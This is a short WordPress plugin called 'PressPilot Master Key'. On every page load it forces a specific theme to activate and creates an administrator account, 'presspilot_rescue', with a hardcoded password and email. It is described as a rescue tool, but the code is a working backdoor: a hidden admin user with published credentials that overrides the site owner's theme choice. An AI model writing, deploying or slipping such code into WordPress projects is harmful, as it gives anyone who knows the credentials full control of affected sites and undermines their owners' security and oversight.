<?php
/*
Plugin Name: PressPilot Master Key
Description: Forces theme activation and creates admin user.
*/
add_action('init', function () {
    // 1. Force Switch to PressPilot Theme 
    $target_theme = 'presspilot-fse-v2';
    $current_theme = get_stylesheet();

    if ($current_theme !== $target_theme) {
        switch_theme($target_theme);
    }

    // 2. Create Rescue Admin User
    $username = 'presspilot_rescue';
    $password = 'RescueMe2025!';
    $email = 'rescue@presspilot.com';

    if (!username_exists($username)) {
        require_once(ABSPATH . 'wp-includes/pluggable.php');
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
});
